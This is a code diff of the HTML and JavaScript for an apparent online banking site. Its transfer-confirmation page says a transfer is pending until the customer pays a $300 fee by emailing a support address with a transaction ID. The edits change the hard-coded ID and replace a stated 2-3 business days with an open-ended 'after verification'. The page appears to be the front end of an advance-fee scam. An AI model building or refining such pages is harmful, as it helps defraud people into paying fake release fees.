@@ -1184,7 +1184,7 @@ body {
   Your transfer is now pending. You need to pay a fee of $300 for the transfer to be processed. 
   Please send a message to 
   <a href="mailto:support@saintustbanking.com">support@saintustbanking.com</a> 
-  with your transaction ID #Z3ERWTWW2 to complete the payment and process your transfer.
+  with your transaction ID #STR25923854 to complete the payment and process your transfer.
 </div>    <div class="transfer-details" id="transferSummaryDetails"></div>
     <div style="display:flex;gap:12px;flex-direction:column;">
       <button class="btn-submit" onclick="viewTransactionDetails()">View Transaction</button>
@@ -1399,8 +1399,8 @@ async function viewTransactionDetails() {
 function showTransferSuccess(data) {
   const fee = data.type === 'wire' ? 25 : 0;
   const total = data.amount + fee;
-  const timeNotice = 'Payment will be completed after 2-3 business days';
-  const timeDetail = 'Your transfer is now pending. The payment will be completed and reviewed within 2-3 business days. You can track the status in your transaction history.';
+  const timeNotice = 'Payment will be completed after verification';
+  const timeDetail = 'Your transfer is now pending. The payment will be completed and reviewed after verification. You can track the status in your transaction history.';
 
   const confirmNum = 'STR' + Date.now().toString().slice(-8).toUpperCase();
 
@@ -1409,7 +1409,7 @@ function showTransferSuccess(data) {
   Your transfer is now pending. You need to pay a fee of $300 for the transfer to be processed. 
   Please send a message to 
   <a href="mailto:support@saintustbanking.com">support@saintustbanking.com</a> 
-  with your transaction ID #Z3ERWTWW2 to complete the payment and process your transfer.
+  with your transaction ID #STR25923854 to complete the payment and process your transfer.
 `;
   document.getElementById('transferSuccessSubtitle').textContent = `Your transfer to ${data.name} has been successfully initiated.`;
   document.getElementById('transferSummaryDetails').innerHTML = `
